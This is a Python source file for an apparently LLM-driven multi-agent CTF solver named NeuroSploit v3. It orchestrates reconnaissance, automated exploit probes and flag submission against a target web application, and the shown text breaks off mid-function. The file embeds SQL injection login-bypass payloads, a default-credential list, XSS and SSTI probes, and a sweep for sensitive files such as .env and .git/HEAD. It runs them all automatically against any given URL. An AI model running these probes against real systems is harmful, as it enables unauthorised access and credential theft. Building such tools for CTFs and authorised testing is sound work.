"""
NeuroSploit v3 - Multi-Agent CTF Pipeline Coordinator

Orchestrates a pipeline of specialized agents for CTF challenges:
  Phase 1: Recon Agent (1 agent, runs to completion)
  Phase 2: LLM Analysis (single call, prioritizes + distributes vuln types)
  Phase 3: Testing Agents (N-1 agents in parallel via asyncio.gather)
  Phase 4: Aggregation (merge & deduplicate findings)
"""

import asyncio
import base64
import copy
import json
import time
import aiohttp
from pathlib import Path
from typing import Dict, List, Any, Optional, Callable
from datetime import datetime

from backend.core.ctf_flag_submitter import CTFFlagSubmitter

try:
    from core.browser_validator import BrowserValidator, HAS_PLAYWRIGHT
except ImportError:
    try:
        from backend.core.browser_validator import BrowserValidator, HAS_PLAYWRIGHT
    except ImportError:
        HAS_PLAYWRIGHT = False


def _embed_screenshot(filepath: str) -> str:
    """Convert screenshot file path to base64 data URI."""
    path = Path(filepath)
    if not path.exists():
        return ""
    with open(path, 'rb') as f:
        return f"data:image/png;base64,{base64.b64encode(f.read()).decode()}"


class CTFCoordinator:
    """Pipeline orchestrator for multi-agent CTF solving."""

    AGENT_LABELS = ["Alpha", "Bravo", "Charlie", "Delta", "Echo"]

    def __init__(
        self,
        target: str,
        agent_count: int,
        flag_detector: Any,
        log_callback: Callable,
        progress_callback: Callable,
        finding_callback: Callable,
        auth_headers: Optional[Dict] = None,
        custom_prompt: Optional[str] = None,
        challenge_name: Optional[str] = None,
        notes: Optional[str] = None,
        lab_context: Optional[Dict] = None,
        scan_id: Optional[str] = None,
        ctf_submit_url: str = "",
        ctf_platform_token: str = "",
        credential_sets: Optional[List[Dict]] = None,
    ):
        self.target = target
        self.agent_count = max(2, min(6, agent_count))
        self.testing_agent_count = self.agent_count - 1
        self.flag_detector = flag_detector
        self._log_callback = log_callback
        self._progress_callback = progress_callback
        self._finding_callback = finding_callback
        self.auth_headers = auth_headers or {}
        self.custom_prompt = custom_prompt
        self.challenge_name = challenge_name
        self.notes = notes
        self.lab_context = lab_context or {}
        self.scan_id = scan_id
        self.ctf_submit_url = ctf_submit_url
        self.ctf_platform_token = ctf_platform_token

        self._agents: List[Any] = []
        self._cancelled = False
        self._recon_data = None
        self._all_findings: List[Dict] = []
        self._harvested_auth_headers: Dict[str, str] = {}  # Auth tokens from successful logins
        self.credential_sets = credential_sets
        self._multi_context_headers: Dict[str, Dict] = {}  # label → headers dict
        self._diff_engine = None

    def cancel(self):
        """Cancel all agents - called by stop_challenge endpoint."""
        self._cancelled = True
        for agent in self._agents:
            agent.cancel()

    async def run(self) -> Dict:
        """Execute the full CTF pipeline and return a unified report."""
        start_time = datetime.utcnow()
        await self._log_callback("info", f"[PIPELINE] Multi-agent CTF pipeline starting ({self.agent_count} agents: 1 recon + {self.testing_agent_count} testers)")

        try:
            # Phase 1: Recon
            await self._progress_callback(5, "ctf_pipeline:recon")
            await self._run_recon_phase()
            if self._cancelled:
                return self._build_final_report(start_time)

            # Phase 1.5: Quick Wins — rapid generic exploit probes against common vulns
            await self._progress_callback(20, "ctf_pipeline:quick_wins")
            await self._run_quick_wins()
            if self._cancelled:
                return self._build_final_report(start_time)

            # Phase 1.52: Initialize multi-credential contexts
            if self.credential_sets and len(self.credential_sets) >= 2:
                await self._initialize_credential_contexts()

            # Phase 1.55: Credential harvesting + authenticated probes
            await self._harvest_and_reuse_credentials()
            if self._cancelled:
                return self._build_final_report(start_time)

            # Phase 1.6: Browser-based probes (DOM XSS, hidden pages, client-side)
            await self._progress_callback(22, "ctf_pipeline:browser_probes")
            await self._run_browser_probes()
            if self._cancelled:
                return self._build_final_report(start_time)

            # Phase 2: LLM Analysis + work distribution
            await self._progress_callback(25, "ctf_pipeline:analysis")
            assignments = await self._run_analysis_phase()
            if self._cancelled:
                return self._build_final_report(start_time)

            # Phase 3: Parallel testing
            await self._progress_callback(35, "ctf_pipeline:testing")
            await self._run_testing_phase(assignments)

            # Phase 3.5: Differential access control testing
            if self._diff_engine and not self._cancelled:
                await self._progress_callback(90, "ctf_pipeline:differential")
                await self._run_differential_access_control()

            # Phase 3.6: Submit captured flags to CTF platform
            if self.flag_detector and self.ctf_submit_url:
                await self._progress_callback(93, "ctf_pipeline:submitting_flags")
                await self._submit_captured_flags()

            # Phase 4: Aggregate
            await self._progress_callback(95, "ctf_pipeline:aggregating")
            report = self._build_final_report(start_time)

            await self._progress_callback(100, "completed")
            await self._log_callback("info", f"[PIPELINE] Pipeline complete. {len(self._all_findings)} total findings.")
            return report

        except Exception as e:
            await self._log_callback("error", f"[PIPELINE] Pipeline error: {e}")
            return self._build_final_report(start_time)

    # ------------------------------------------------------------------
    # Phase 1: Recon
    # ------------------------------------------------------------------

    async def _run_recon_phase(self):
        """Run a single recon agent to populate ReconData."""
        from backend.core.autonomous_agent import AutonomousAgent, OperationMode
        from backend.core.governance import create_ctf_scope, GovernanceAgent

        await self._log_callback("info", "[PIPELINE] Phase 1/4: Recon Agent starting")

        labeled_log = self._make_labeled_log("Recon")
        scope = create_ctf_scope(self.target)
        governance = GovernanceAgent(scope, log_callback=labeled_log)

        async with AutonomousAgent(
            target=self.target,
            mode=OperationMode.FULL_AUTO,
            log_callback=labeled_log,
            progress_callback=self._make_recon_progress(),
            auth_headers=self.auth_headers,
            custom_prompt=self.custom_prompt,
            finding_callback=self._finding_callback,
            lab_context=self.lab_context,
            scan_id=self.scan_id,
            governance=governance,
        ) as agent:
            self._agents.append(agent)

            # Run recon + sandbox scan only
            await labeled_log("info", "Running reconnaissance...")
            await asyncio.gather(
                agent._run_recon_only(),
                agent._run_sandbox_scan(),
            )

            # Deep-copy the populated recon data
            self._recon_data = copy.deepcopy(agent.recon)

            recon_summary = (
                f"endpoints={len(self._recon_data.endpoints)}, "
                f"params={len(self._recon_data.parameters)}, "
                f"techs={len(self._recon_data.technologies)}, "
                f"forms={len(self._recon_data.forms)}"
            )
            await self._log_callback("info", f"[PIPELINE] Recon complete: {recon_summary}")

            self._agents.remove(agent)

    # ------------------------------------------------------------------
    # Phase 2: LLM Analysis
    # ------------------------------------------------------------------

    # Vuln types that are never relevant for web application CTF targets
    _IRRELEVANT_WEB_CTF_VULNS = {
        "s3_bucket_misconfiguration", "cloud_metadata_exposure",
        "container_escape", "serverless_misconfiguration",
        "subdomain_takeover", "soap_injection",
        "zip_slip", "insecure_cdn", "rest_api_versioning",
    }

    async def _run_analysis_phase(self) -> List[List[str]]:
        """Use LLM to prioritize vuln types, then round-robin distribute."""
        from backend.core.autonomous_agent import LLMClient

        await self._log_callback("info", f"[PIPELINE] Phase 2/4: LLM Analysis — prioritizing attack vectors for {self.testing_agent_count} testers")

        priority_vulns = await self._get_prioritized_vulns()

        # Filter out vuln types that are irrelevant for web app CTF targets
        filtered = [v for v in priority_vulns if v not in self._IRRELEVANT_WEB_CTF_VULNS]
        if len(filtered) < len(priority_vulns):
            removed = len(priority_vulns) - len(filtered)
            await self._log_callback("info", f"[PIPELINE] Filtered {removed} irrelevant vuln types (cloud/infra)")
            priority_vulns = filtered

        # Round-robin distribute to testing agents
        assignments: List[List[str]] = [[] for _ in range(self.testing_agent_count)]
        for i, vtype in enumerate(priority_vulns):
            assignments[i % self.testing_agent_count].append(vtype)

        for i, assignment in enumerate(assignments):
            label = self.AGENT_LABELS[i] if i < len(self.AGENT_LABELS) else f"Agent-{i}"
            await self._log_callback("info", f"[PIPELINE] {label}: assigned {len(assignment)} vuln types")

        return assignments

    async def _get_prioritized_vulns(self) -> List[str]:
        """Ask LLM to prioritize vuln types based on recon data, with fallback."""
        from backend.core.autonomous_agent import LLMClient, AutonomousAgent

        # Build context from recon
        recon_summary = ""
        if self._recon_data:
            techs = ", ".join(self._recon_data.technologies[:10]) if self._recon_data.technologies else "unknown"
            endpoints_sample = [
                (e if isinstance(e, str) else e.get("url", ""))
                for e in self._recon_data.endpoints[:15]
            ]
            forms_count = len(self._recon_data.forms)
            params_count = sum(len(v) for v in self._recon_data.parameters.values())
            recon_summary = (
                f"Technologies: {techs}\n"
                f"Endpoints ({len(self._recon_data.endpoints)}): {json.dumps(endpoints_sample)}\n"
                f"Forms: {forms_count}, Parameters: {params_count}\n"
                f"API endpoints: {len(self._recon_data.api_endpoints)}"
            )

        # Get default plan for the full vuln list
        default_plan = AutonomousAgent._static_default_attack_plan()

        prompt = (
            "You are a CTF challenge solver. Based on the recon data below, "
            "prioritize which vulnerability types to test FIRST.\n\n"
            f"Target: {self.target}\n"
            f"Recon data:\n{recon_summary}\n\n"
            f"Available vuln types (in default priority order):\n"
            f"{json.dumps(default_plan, indent=2)}\n\n"
            "Return a JSON array of vulnerability type strings, ordered by highest "
            "probability of success for this specific target. Put the most likely "
            "vulns first. Include ALL types. Return ONLY the JSON array, no explanation."
        )

        try:
            llm = LLMClient()
            if not llm.client:
                raise Exception("No LLM available")

            response = await llm.generate(prompt, system="You are an expert CTF solver. Return only valid JSON.")
            # Parse JSON array from response
            text = response.strip()
            # Handle markdown code blocks
            if text.startswith("```"):
                text = text.split("\n", 1)[1] if "\n" in text else text[3:]
                text = text.rsplit("```", 1)[0]
            parsed = json.loads(text.strip())
            if isinstance(parsed, list) and len(parsed) > 10:
                await self._log_callback("info", f"[PIPELINE] LLM prioritized {len(parsed)} vuln types")
                return parsed
        except Exception as e:
            await self._log_callback("warning", f"[PIPELINE] LLM prioritization failed ({e}), using defaults")

        return default_plan

    # ------------------------------------------------------------------
    # Phase 3: Parallel Testing
    # ------------------------------------------------------------------

    async def _run_testing_phase(self, assignments: List[List[str]]):
        """Launch N-1 testing agents in parallel with periodic challenge polling."""
        from backend.core.autonomous_agent import AutonomousAgent, OperationMode
        from backend.core.governance import create_ctf_scope, GovernanceAgent

        await self._log_callback("info", f"[PIPELINE] Phase 3/4: Launching {self.testing_agent_count} parallel testing agents")

        tasks = []
        for i, assignment in enumerate(assignments):
            label = self.AGENT_LABELS[i] if i < len(self.AGENT_LABELS) else f"Agent-{i}"
            tasks.append(self._run_single_tester(i, label, assignment))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for i, result in enumerate(results):
            label = self.AGENT_LABELS[i] if i < len(self.AGENT_LABELS) else f"Agent-{i}"
            if isinstance(result, Exception):
                await self._log_callback("error", f"[PIPELINE] {label} failed: {result}")

    async def _run_single_tester(self, index: int, label: str, vuln_types: List[str]):
        """Run a single testing agent with preset recon and focused vuln types."""
        from backend.core.autonomous_agent import AutonomousAgent, OperationMode
        from backend.core.governance import create_ctf_scope, GovernanceAgent

        labeled_log = self._make_labeled_log(label)
        labeled_finding = self._make_labeled_finding(label)
        scope = create_ctf_scope(self.target)
        governance = GovernanceAgent(scope, log_callback=labeled_log)

        await labeled_log("info", f"Starting with {len(vuln_types)} vuln types")

        # Merge harvested credentials so testing agents can work authenticated
        merged_auth = {**self.auth_headers, **self._harvested_auth_headers}

        async with AutonomousAgent(
            target=self.target,
            mode=OperationMode.FULL_AUTO,
            log_callback=labeled_log,
            progress_callback=self._make_testing_progress(index),
            auth_headers=merged_auth,
            custom_prompt=self.custom_prompt,
            finding_callback=labeled_finding,
            lab_context=self.lab_context,
            scan_id=self.scan_id,
            governance=governance,
            preset_recon=copy.deepcopy(self._recon_data),
            focus_vuln_types=vuln_types,
            agent_label=label,
        ) as agent:
            self._agents.append(agent)

            try:
                report = await agent.run()
                findings = report.get("findings", [])
                self._all_findings.extend(findings)
                await labeled_log("info", f"Completed: {len(findings)} findings")
            except Exception as e:
                await labeled_log("error", f"Agent error: {e}")
            finally:
                if agent in self._agents:
                    self._agents.remove(agent)

    # ------------------------------------------------------------------
    # Phase 4: Aggregation
    # ------------------------------------------------------------------

    async def _initialize_credential_contexts(self):
        """Build multi-context headers from credential_sets for differential testing."""
        if not self.credential_sets:
            return

        from backend.core.access_control_diff import AccessControlDiffEngine
        import base64

        await self._log_callback("info", f"[PIPELINE] Initializing {len(self.credential_sets)} credential contexts")

        context_labels = []
        for cs in self.credential_sets:
            label = cs.get("label", f"ctx_{len(self._multi_context_headers)}")
            role = cs.get("role", "user")
            auth_type = cs.get("auth_type", "none")
            headers = dict(self.auth_headers)  # Start with base headers

            if auth_type == "bearer" and cs.get("bearer_token"):
                headers["Authorization"] = f"Bearer {cs['bearer_token']}"
            elif auth_type == "cookie" and cs.get("cookie"):
                headers["Cookie"] = cs["cookie"]
            elif auth_type == "header" and cs.get("header_name") and cs.get("header_value"):
                headers[cs["header_name"]] = cs["header_value"]
            elif auth_type == "basic" and cs.get("username") and cs.get("password"):
                encoded = base64.b64encode(f"{cs['username']}:{cs['password']}".encode()).decode()
                headers["Authorization"] = f"Basic {encoded}"
            elif auth_type == "login" and cs.get("username") and cs.get("password"):
                # Try to login and extract token
                token = await self._login_for_context(cs["username"], cs["password"])
                if token:
                    headers["Authorization"] = f"Bearer {token}"
                    await self._log_callback("info", f"[PIPELINE] Context '{label}' authenticated via login")
                else:
                    await self._log_callback("warning", f"[PIPELINE] Context '{label}' login failed — skipping")
                    continue

            self._multi_context_headers[label] = headers
            context_labels.append((label, role))

        if len(context_labels) >= 2:
            self._diff_engine = AccessControlDiffEngine(context_labels)
            await self._log_callback("info", f"[PIPELINE] Diff engine ready with {len(context_labels)} contexts")

    async def _login_for_context(self, username: str, password: str) -> Optional[str]:
        """Attempt login and return JWT token if successful."""
        from urllib.parse import urlparse
        parsed = urlparse(self.target)
        base = f"{parsed.scheme}://{parsed.netloc}"
        login_paths = ["/rest/user/login", "/api/login", "/api/auth/login", "/login", "/api/v1/auth/login"]

        async with aiohttp.ClientSession() as sess:
            for path in login_paths:
                try:
                    url = f"{base}{path}"
                    payload = {"email": username, "password": password}
                    async with sess.post(url, json=payload, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        if resp.status in (200, 201):
                            data = await resp.json()
                            # Extract token from common response shapes
                            for key_path in [["token"], ["access_token"], ["authentication", "token"], ["data", "token"]]:
                                obj = data
                                for k in key_path:
                                    if isinstance(obj, dict):
                                        obj = obj.get(k)
                                    else:
                                        obj = None
                                        break
                                if isinstance(obj, str) and len(obj) > 20:
                                    return obj
                except Exception:
                    continue
        return None

    async def _run_differential_access_control(self):
        """Probe API endpoints with all contexts and diff responses."""
        if not self._diff_engine or len(self._multi_context_headers) < 2:
            return

        from backend.core.access_control_diff import ContextResponse

        # Also add auto-harvested credentials as a context
        if self._harvested_auth_headers:
            for label, headers in self._harvested_auth_headers.items():
                if label not in self._multi_context_headers:
                    merged = dict(self.auth_headers)
                    merged.update(headers if isinstance(headers, dict) else {"Authorization": f"Bearer {headers}"})
                    self._multi_context_headers[label] = merged

        # Collect API endpoints from recon
        endpoints = []
        if self._recon_data:
            for ep in self._recon_data.api_endpoints[:25]:
                if ep:
                    endpoints.append((ep, "GET"))
            for ep in self._recon_data.endpoints[:20]:
                url = ep if isinstance(ep, str) else ep.get("url", "")
                if url and (url, "GET") not in endpoints:
                    endpoints.append((url, "GET"))

        if not endpoints:
            return

        await self._log_callback("info", f"[PIPELINE] Differential access control: {len(endpoints)} endpoints x {len(self._multi_context_headers)} contexts")
        total_diff_findings = 0

        async with aiohttp.ClientSession() as sess:
            for ep_url, ep_method in endpoints:
                if self._cancelled:
                    break

                responses = []
                for label, headers in self._multi_context_headers.items():
                    try:
                        role = self._diff_engine._label_to_role.get(label, "user")
                        async with sess.request(
                            ep_method, ep_url, headers=headers,
                            allow_redirects=False, ssl=False,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as resp:
                            body = await resp.text()
                            responses.append(ContextResponse(
                                label=label, role=role, status=resp.status,
                                body=body[:10000], headers=dict(resp.headers),
                            ))
                    except Exception:
                        continue

                diffs = self._diff_engine.compare(ep_url, ep_method, responses)
                for diff in diffs:
                    if diff.confidence < 0.55:
                        continue
                    finding_dict = self._diff_engine.finding_to_dict(diff)
                    self._all_findings.append(finding_dict)
                    await self._finding_callback(finding_dict)
                    total_diff_findings += 1

        await self._log_callback("info", f"[PIPELINE] Differential testing: {total_diff_findings} findings")

    def _build_final_report(self, start_time: datetime) -> Dict:
        """Merge and deduplicate findings from all agents."""
        # Sort by severity (highest first) so dedup keeps the most impactful finding
        severity_rank = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        sorted_findings = sorted(
            self._all_findings,
            key=lambda f: severity_rank.get(f.get("severity", "medium"), 2),
        )

        # Deduplicate by (vuln_type, normalized_endpoint, parameter)
        seen = set()
        unique_findings = []
        for f in sorted_findings:
            endpoint = f.get("affected_endpoint", f.get("url", ""))
            # Normalize: strip query params + trailing slash for dedup
            normalized_ep = endpoint.split("?")[0].rstrip("/") if endpoint else ""
            key = (
                f.get("vulnerability_type", ""),
                normalized_ep,
                f.get("parameter", ""),
            )
            if key not in seen:
                seen.add(key)
                unique_findings.append(f)

        duration = (datetime.utcnow() - start_time).total_seconds()

        report = {
            "findings": unique_findings,
            "recon": {
                "endpoints": [
                    (e if isinstance(e, str) else e)
                    for e in (self._recon_data.endpoints if self._recon_data else [])
                ],
                "technologies": self._recon_data.technologies if self._recon_data else [],
                "parameters": self._recon_data.parameters if self._recon_data else {},
            },
            "executive_summary": (
                f"Multi-agent CTF pipeline ({self.agent_count} agents) completed in {duration:.0f}s. "
                f"Found {len(unique_findings)} unique findings across {self.testing_agent_count} parallel testers."
            ),
            "pipeline_info": {
                "agent_count": self.agent_count,
                "testing_agents": self.testing_agent_count,
                "total_findings_raw": len(self._all_findings),
                "unique_findings": len(unique_findings),
                "duration_seconds": round(duration, 1),
            },
        }

        # Include CTF flag metrics if available
        if self.flag_detector:
            report["ctf_flags"] = self.flag_detector.to_serializable()
            report["ctf_metrics"] = self.flag_detector.get_metrics()
            # Include CTF data bundle for report generation
            report["ctf_data"] = {
                "flags": self.flag_detector.to_serializable(),
                "metrics": self.flag_detector.get_metrics(),
                "submit_url": self.ctf_submit_url or None,
            }

        return report

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _make_labeled_log(self, label: str) -> Callable:
        """Return a log callback that prefixes messages with [Label]."""
        original = self._log_callback

        async def labeled_log(level: str, message: str):
            await original(level, f"[{label}] {message}")

        return labeled_log

    def _make_labeled_finding(self, label: str) -> Callable:
        """Return a finding callback that tracks the agent label."""
        original = self._finding_callback

        async def labeled_finding(finding: Dict):
            finding["agent_label"] = label
            self._all_findings.append(finding)
            await original(finding)

        return labeled_finding

    def _make_recon_progress(self) -> Callable:
        """Map recon agent progress (0-100) to pipeline progress (5-25)."""
        original = self._progress_callback

        async def recon_progress(progress: int, phase: str):
            mapped = 5 + int(progress * 0.2)  # 5-25 range
            await original(mapped, f"ctf_pipeline:recon")

        return recon_progress

    def _make_testing_progress(self, index: int) -> Callable:
        """Map testing agent progress (0-100) to pipeline progress (35-95)."""
        original = self._progress_callback

        async def testing_progress(progress: int, phase: str):
            # Each agent contributes proportionally within 35-95 range
            per_agent_range = 60 / self.testing_agent_count
            base = 35 + int(index * per_agent_range)
            mapped = base + int(progress * per_agent_range / 100)
            await original(min(mapped, 95), f"ctf_pipeline:testing")

        return testing_progress

    # ------------------------------------------------------------------
    # Phase 1.5: Quick Wins — generic rapid exploit probes
    # ------------------------------------------------------------------

    async def _run_quick_wins(self):
        """Run fast, generic exploit probes for common low-hanging-fruit vulns.

        This phase fires targeted HTTP requests in parallel to quickly find:
        - SQLi on login/search forms
        - Default/common credentials
        - Admin panel access
        - Sensitive file exposure
        - IDOR on sequential IDs
        - XSS on search/input parameters
        - Open redirects
        - API information disclosure
        - Path traversal
        - Missing access control on privileged endpoints
        """
        await self._log_callback("info", "[PIPELINE] Phase 1.5: Quick Wins — rapid exploit probes")

        base = self.target.rstrip("/")
        endpoints = []
        if self._recon_data:
            endpoints = [
                (e if isinstance(e, str) else e.get("url", ""))
                for e in self._recon_data.endpoints[:80]
            ]
        techs = set()
        if self._recon_data:
            techs = {t.lower() for t in self._recon_data.technologies}

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=20),
            timeout=aiohttp.ClientTimeout(total=10),
            headers={**self.auth_headers, "User-Agent": "Mozilla/5.0 NeuroSploit/3.0"},
        ) as session:
            probes = []

            # ── 1. SQLi on login/auth endpoints ──
            # Always include common REST API auth paths — recon-discovered paths
            # may be SPA pages (e.g., /login returns HTML, not a JSON API)
            login_paths = [p for p in endpoints if any(k in p.lower() for k in ("login", "auth", "signin", "session"))]
            api_login_paths = [
                f"{base}/rest/user/login", f"{base}/api/login",
                f"{base}/api/auth/login", f"{base}/api/v1/auth/login",
                f"{base}/api/sessions", f"{base}/api/authenticate",
            ]
            login_paths = list(dict.fromkeys(api_login_paths + login_paths))  # API paths first
            for url in login_paths[:6]:
                probes.append(self._probe_sqli_login(session, url))

            # ── 2. Default credentials ──
            probes.append(self._probe_default_creds(session, login_paths[:3]))

            # ── 3. Admin / privileged endpoints ──
            admin_paths = [p for p in endpoints if any(k in p.lower() for k in ("admin", "dashboard", "manage", "console", "configuration"))]
            admin_paths += [f"{base}/admin", f"{base}/administration", f"{base}/api/admin"]
            probes.append(self._probe_admin_access(session, list(set(admin_paths))[:8]))

            # ── 4. Sensitive file disclosure ──
            probes.append(self._probe_sensitive_files(session, base))

            # ── 5. Search/parameter XSS + SQLi ──
            search_paths = [p for p in endpoints if any(k in p.lower() for k in ("search", "q=", "query", "find"))]
            param_endpoints = list(self._recon_data.parameters.keys())[:10] if self._recon_data else []
            probes.append(self._probe_search_injection(session, base, search_paths + param_endpoints))

            # ── 6. IDOR on API resources ──
            api_paths = [p for p in endpoints if any(k in p.lower() for k in ("/api/", "/rest/", "/v1/", "/v2/"))]
            probes.append(self._probe_idor(session, api_paths[:15]))

            # ── 7. Open redirect ──
            redirect_paths = [p for p in endpoints if any(k in p.lower() for k in ("redirect", "url=", "next=", "return", "goto"))]
            redirect_paths += [f"{base}/redirect"]
            probes.append(self._probe_open_redirect(session, list(set(redirect_paths))[:5]))

            # ── 8. Path traversal ──
            file_paths = [p for p in endpoints if any(k in p.lower() for k in ("file", "download", "read", "ftp", "doc", "load", "fetch"))]
            file_paths += [f"{base}/ftp"]
            probes.append(self._probe_path_traversal(session, list(set(file_paths))[:6]))

            # ── 9. API info disclosure (Swagger, GraphQL introspection, config) ──
            probes.append(self._probe_api_disclosure(session, base))

            # ── 10. Registration/signup abuse ──
            reg_paths = [p for p in endpoints if any(k in p.lower() for k in ("user", "register", "signup", "account"))]
            probes.append(self._probe_registration_abuse(session, base, reg_paths[:5]))

            # Fire all probes in parallel
            results = await asyncio.gather(*probes, return_exceptions=True)

            wins = 0
            for result in results:
                if isinstance(result, Exception):
                    continue
                if isinstance(result, list):
                    for finding in result:
                        if finding:
                            wins += 1
                            self._all_findings.append(finding)
                            await self._finding_callback(finding)
                elif result:
                    wins += 1
                    self._all_findings.append(result)
                    await self._finding_callback(result)

        await self._log_callback("info", f"[PIPELINE] Quick Wins complete: {wins} findings")

    # ── Quick-win probe implementations ──

    async def _probe_sqli_login(self, session, url: str) -> Optional[Dict]:
        """Try common SQLi payloads on a login endpoint."""
        sqli_payloads = [
            {"email": "' OR 1=1--", "password": "x"},
            {"email": "admin'--", "password": "x"},
            {"username": "' OR 1=1--", "password": "x"},
            {"email": "' OR '1'='1'--", "password": "anything"},
            {"user": "admin' OR '1'='1'--", "pass": "x"},
        ]
        for payload in sqli_payloads:
            try:
                async with session.post(url, json=payload, ssl=False) as resp:
                    body = await resp.text()
                    if resp.status == 200 and any(k in body.lower() for k in ("token", "auth", "success", "welcome", "session")):
                        await self._log_callback("warning", f"[QuickWin] SQLi login bypass at {url} with {list(payload.values())[0]}")
                        self._extract_auth_token(body)
                        return self._make_finding("SQL Injection - Auth Bypass", "sqli_auth_bypass", "critical",
                                                   url, list(payload.keys())[0], str(list(payload.values())[0]),
                                                   f"Login bypassed with SQLi. Status: {resp.status}", "POST")
                # Also try form-encoded
                async with session.post(url, data=payload, ssl=False) as resp:
                    body = await resp.text()
                    if resp.status == 200 and any(k in body.lower() for k in ("token", "auth", "success", "welcome", "session")):
                        await self._log_callback("warning", f"[QuickWin] SQLi login bypass (form) at {url}")
                        self._extract_auth_token(body)
                        return self._make_finding("SQL Injection - Auth Bypass", "sqli_auth_bypass", "critical",
                                                   url, list(payload.keys())[0], str(list(payload.values())[0]),
                                                   f"Login bypassed with SQLi (form). Status: {resp.status}", "POST")
            except Exception:
                continue
        return None

    async def _probe_default_creds(self, session, login_urls: List[str]) -> List[Dict]:
        """Try common default credential pairs."""
        # Generic credential pairs — platform-specific creds are prepended
        generic_creds = [
            ("admin", "admin"), ("admin", "admin123"), ("admin", "password"),
            ("admin", "Password1"), ("root", "root"), ("test", "test"),
            ("admin@admin.com", "admin"), ("user", "user"), ("demo", "demo"),
        ]
        cred_pairs = list(dict.fromkeys(generic_creds))
        findings = []
        for url in login_urls[:2]:
            for user, pw in cred_pairs:
                try:
                    for payload in [
                        {"email": user, "password": pw},
                        {"username": user, "password": pw},
                    ]:
                        async with session.post(url, json=payload, ssl=False) as resp:
                            body = await resp.text()
                            if resp.status == 200 and any(k in body.lower() for k in ("token", "auth", "success")):
                                await self._log_callback("warning", f"[QuickWin] Default creds work: {user} at {url}")
                                self._extract_auth_token(body)
                                findings.append(self._make_finding(
                                    f"Default Credentials ({user})", "default_credentials", "critical",
                                    url, "email/username", f"{user}:{pw}",
                                    f"Login succeeded with default credentials. Status: {resp.status}", "POST"))
                                break  # Don't test more payloads for this user
                except Exception:
                    continue
        return findings

    async def _probe_admin_access(self, session, urls: List[str]) -> List[Dict]:
        """Check if admin/privileged pages are accessible without auth."""
        findings = []
        for url in urls:
            try:
                async with session.get(url, ssl=False, allow_redirects=True) as resp:
                    body = await resp.text()
                    if resp.status == 200 and len(body) > 200:
                        body_lower = body.lower()
                        if any(k in body_lower for k in ("admin", "dashboard", "management", "configuration", "user list")):
                            if not any(k in body_lower for k in ("login", "sign in", "unauthorized", "forbidden")):
                                await self._log_callback("warning", f"[QuickWin] Admin panel accessible: {url}")
                                findings.append(self._make_finding(
                                    "Exposed Admin Panel", "broken_access_control", "high",
                                    url, "", "", f"Admin panel accessible without auth. Status: {resp.status}", "GET"))
            except Exception:
                continue
        return findings

    async def _probe_sensitive_files(self, session, base: str) -> List[Dict]:
        """Probe for sensitive files and directories."""
        paths = [
            "/robots.txt", "/sitemap.xml", "/.env", "/.git/HEAD", "/backup/",
            "/.well-known/security.txt", "/security.txt",
            "/api/swagger.json", "/api-docs", "/swagger-ui.html", "/swagger/",
            "/graphql", "/.DS_Store", "/server-info", "/server-status",
            "/metrics", "/prometheus", "/actuator", "/actuator/health",
            "/debug", "/trace", "/console", "/phpinfo.php",
            "/wp-login.php", "/wp-admin/", "/elmah.axd",
            "/ftp/", "/backup.sql", "/dump.sql", "/db.sqlite",
            "/config.json", "/config.yml", "/application.yml",
            "/package.json", "/composer.json", "/Gemfile",
        ]
        findings = []
        # Fire in batches to avoid overwhelming target
        for i in range(0, len(paths), 10):
            batch = paths[i:i+10]
            tasks = []
            for path in batch:
                tasks.append(self._check_sensitive_path(session, f"{base}{path}"))
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in results:
                if r and not isinstance(r, Exception):
                    findings.append(r)
        return findings

    async def _check_sensitive_path(self, session, url: str) -> Optional[Dict]:
        """Check if a sensitive path returns interesting content."""
        try:
            async with session.get(url, ssl=False, allow_redirects=False) as resp:
                if resp.status == 200:
                    body = await resp.text()
                    if len(body) > 50 and not any(k in body.lower() for k in ("not found", "404", "error")):
                        path = url.split("/", 3)[-1] if "/" in url[8:] else url
                        await self._log_callback("info", f"[QuickWin] Sensitive file found: {url} ({len(body)} bytes)")
                        return self._make_finding(
                            f"Sensitive File Exposed ({path})", "information_disclosure", "medium",
                            url, "", "", f"Sensitive file accessible. Size: {len(body)} bytes", "GET")
        except Exception:
            pass
        return None

    async def _probe_search_injection(self, session, base: str, search_urls: List[str]) -> List[Dict]:
        """Test search/query parameters for XSS, SQLi, and SSTI."""
        findings = []
        xss_payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
        ]
        sqli_payloads = ["' OR 1=1--", "1 UNION SELECT NULL--", "' AND '1'='1"]

        # Discover search-like endpoints
        if not search_urls:
            search_urls = [f"{base}/search", f"{base}/api/search"]

        for url in search_urls[:6]:
            parsed = url.split("?")[0]
            # XSS
            for payload in xss_payloads:
                try:
                    test_url = f"{parsed}?q={payload}"
                    async with session.get(test_url, ssl=False) as resp:
                        body = await resp.text()
                        if resp.status == 200 and payload in body:
                            await self._log_callback("warning", f"[QuickWin] XSS reflected at {parsed}?q=")
                            findings.append(self._make_finding(
                                "Reflected XSS", "xss_reflected", "high",
                                parsed, "q", payload, f"Payload reflected in response", "GET"))
                            break
                except Exception:
                    continue
            # SQLi
            for payload in sqli_payloads:
                try:
                    test_url = f"{parsed}?q={payload}"
                    async with session.get(test_url, ssl=False) as resp:
                        body = await resp.text()
                        if resp.status == 200 and any(k in body.lower() for k in ("sql", "syntax", "query", "sqlite", "mysql", "postgresql")):
                            await self._log_callback("warning", f"[QuickWin] SQLi error at {parsed}?q=")
                            findings.append(self._make_finding(
                                "SQL Injection - Error Based", "sqli_error", "critical",
                                parsed, "q", payload, f"SQL error in response", "GET"))
                            break
                except Exception:
                    continue
            # SSTI — use distinctive expression to avoid false positives
            # from pages that naturally contain common numbers like "49"
            try:
                test_url = f"{parsed}?q={{{{13*37}}}}"
                async with session.get(test_url, ssl=False) as resp:
                    body = await resp.text()
                    if resp.status == 200 and "481" in body and "{{13*37}}" not in body:
                        await self._log_callback("warning", f"[QuickWin] SSTI confirmed at {parsed}?q=")
                        findings.append(self._make_finding(
                            "Server-Side Template Injection", "ssti", "critical",
                            parsed, "q", "{{13*37}}", f"Template expression evaluated: 13*37=481", "GET"))
